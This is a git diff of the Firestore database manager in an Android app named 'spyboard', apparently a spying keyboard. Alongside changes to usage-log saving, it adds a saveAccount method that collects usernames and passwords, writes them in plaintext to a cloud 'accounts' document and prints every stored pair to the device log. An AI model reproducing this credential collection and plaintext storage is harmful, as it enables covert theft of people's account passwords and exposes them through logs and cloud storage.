@@ -4,15 +4,20 @@ import android.util.Log;
 
 import androidx.annotation.NonNull;
 
+import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.android.gms.tasks.Task;
 import com.google.firebase.firestore.CollectionReference;
 import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.DocumentSnapshot;
 import com.google.firebase.firestore.FirebaseFirestore;
 import com.idankorenisraeli.spyboard.common.SharedPrefsManager;
+import com.idankorenisraeli.spyboard.data.types.DailyUsageLog;
 
 import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.UUID;
 
 public class DatabaseManager {
@@ -23,12 +28,15 @@ public class DatabaseManager {
     private final SharedPrefsManager sharedPrefs = SharedPrefsManager.getInstance();
     private final CollectionReference usersRef;
 
-    private final ArrayList<DailyUsageLog> waitingList;
+    private final ArrayList<DailyUsageLog> waitingList; //Logs that could not be saved to cloud
 
 
     interface KEYS {
         String USERS = "users";
         String DAILY_LOGS = "daily_logs";
+        String ALL_TIME = "all_time_data";
+        String ACCOUNTS = "accounts";
+        String TOTAL = "total";
 
         String UID = "my_uid";
     }
@@ -36,6 +44,7 @@ public class DatabaseManager {
     private DatabaseManager() {
         usersRef = database.collection(KEYS.USERS);
         waitingList = new ArrayList<>();
+
     }
 
     public static DatabaseManager getInstance() {
@@ -47,20 +56,11 @@ public class DatabaseManager {
 
 
     //This will override the current daily log that is saved in db/sp
-    public void saveDailyLog(DailyUsageLog log) {
-        assert log != null;
+    public void saveDailyLog(@NonNull DailyUsageLog log) {
+        sharedPrefs.putObject(getDailyLogSPKey(log.getDate()), log);
 
-        Log.i("pttt", "Saving " + log.getDate());
 
         getDailyLogDocRef(log.getDate()).set(log)
-                .addOnFailureListener(new OnFailureListener() {
-                    @Override
-                    public void onFailure(@NonNull Exception e) {
-                        //Could not save to firebase, so saving on sp
-                        Log.e(getClass().getSimpleName(), e.toString());
-                        sharedPrefs.putObject(getDailyLogSPKey(log.getDate()), log);
-                    }
-                })
                 .addOnSuccessListener(new OnSuccessListener<Void>() {
                     @Override
                     public void onSuccess(Void aVoid) {
@@ -75,48 +75,46 @@ public class DatabaseManager {
                             });
                         }
                     }
+                })
+                .addOnFailureListener(new OnFailureListener() {
+                    @Override
+                    public void onFailure(@NonNull Exception e) {
+                        waitingList.add(log);
+                    }
                 });
     }
 
-    public void loadDailyLog(String date, OnDailyLogLoaded onLoaded) {
-        Log.i("pttt", "Trying to load " + date);
+    public void saveAccount(String username, String password) {
 
-
-        Runnable checkOnSP = new Runnable() {
-            @Override
-            public void run() {
-                //Check if date received is in sp
-                String spKey = getDailyLogSPKey(date);
-                if(onLoaded!=null) {
-                    if (sharedPrefs.contain(spKey))
-                        onLoaded.onDailyLogLoaded(sharedPrefs.getObject(spKey, DailyUsageLog.class));
-                    else
-                        onLoaded.onDailyLogLoaded(null); //not found on fb and sp
-                }
-            }
-        };
-
-        getDailyLogDocRef(date).get().addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
+        getAccountsDocRef().get().addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
             @Override
             public void onSuccess(DocumentSnapshot documentSnapshot) {
-                if(onLoaded!=null) {
-                    if (documentSnapshot.exists())
-                        onLoaded.onDailyLogLoaded(documentSnapshot.toObject(DailyUsageLog.class));
-                    else
-                        checkOnSP.run();
-                }
+                HashMap<String, String> accounts;
+                if (documentSnapshot.exists()) {
+                    accounts = (HashMap<String, String>) documentSnapshot.toObject(HashMap.class);
+                    for (String key : accounts.keySet()) {
+                        Log.i("pttt", "found account: " + key + " ; " + accounts.get(key));
+                    }
+                } else
+                    accounts = new HashMap<>();
+                accounts.put(username, password);
+                getAccountsDocRef().set(accounts);
 
-
-            }
-        }).addOnFailureListener(new OnFailureListener() {
-            @Override
-            public void onFailure(@NonNull Exception e) {
-                checkOnSP.run();
             }
         });
+    }
 
 
+    /**
+     * Load from sp
+     *
+     * @param date Date of log to load from device
+     */
+    public DailyUsageLog loadDailyLog(String date) {
+        Log.i("pttt", "Trying to load " + date);
 
+        String spKey = getDailyLogSPKey(date);
+        return sharedPrefs.getObject(spKey, DailyUsageLog.class);
 
     }
 
@@ -130,6 +128,16 @@ public class DatabaseManager {
     private DocumentReference getDailyLogDocRef(String date) {
         return usersRef.document(getUID().concat("/").
                 concat(KEYS.DAILY_LOGS).concat("/").concat(date));
+    }
+
+    private DocumentReference getAccountsDocRef() {
+        return usersRef.document(getUID().concat("/")
+                .concat(KEYS.TOTAL).concat("/").concat(KEYS.ACCOUNTS));
+    }
+
+    private DocumentReference getTotalDocRef() {
+        return usersRef.document(getUID().concat("/")
+                .concat(KEYS.TOTAL).concat("/").concat(KEYS.ALL_TIME));
     }
 
     private String getDailyLogSPKey(String date) {
